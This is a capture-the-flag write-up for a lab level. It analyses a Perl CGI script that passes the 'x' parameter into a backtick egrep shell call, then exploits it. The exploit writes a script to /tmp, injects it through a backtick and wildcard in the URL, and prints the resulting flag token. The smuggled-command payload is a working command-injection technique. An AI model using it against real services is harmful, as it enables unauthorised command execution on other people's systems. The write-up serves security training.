##### 1 - Analyze the file
``cat level12.pl``

>\#!/usr/bin/env perl
>\# localhost:4646
>use CGI qw{param};
>print "Content-type: text/html\n\n";
>
>sub t {
>  $nn = $_[1];
>  $xx = $_[0];
>  $xx =~ tr/a-z/A-Z/;
>  $xx =~ s/\s.*//;
>  @output = `egrep "^$xx" /tmp/xd 2>&1`;
>  foreach \$line (@output) {
>      ($f, $s) = split(/:/, $line);
>      if($s =~ $nn) {
>          return 1;
>      }
>  }
>  return 0;
>}
>
>sub n {
>  if($_[0] == 1) {
>      print("..");
>  } else {
>      print(".");
>  }
>}
>
>n(t(param("x"), param("y")));

We see that there's a server running on port 4646, who takes an unprotected argument **x**.
Program chech if a file with the same name (in uppercase) exists in /tmp/.

----

##### 2 - Making the script

Creating a script which launch getflag and send his result to all connected users.
``echo "getflag | wall" > /tmp/AAA``

Setting script as executable
``chmod +x /tmp/AAA``

----

##### 3 - Exploit the vulnerability

We use wildcard ``/*/`` because the script put every char in uppercase and the folder /TMP/ doesn't exists.
``http://10.11.249.58:4646/?x=`/*/AAA` ``
or
``http://10.11.249.58:4646/?x=`/*/aaa` ``

----

##### 4 - Getting the flag

>Broadcast Message from flag12@Snow
>        (somewhere) at 14:58 ...
>
>Check flag.Here is your token : **g1qKMiRpXf53AWhDaU7FEkczr**
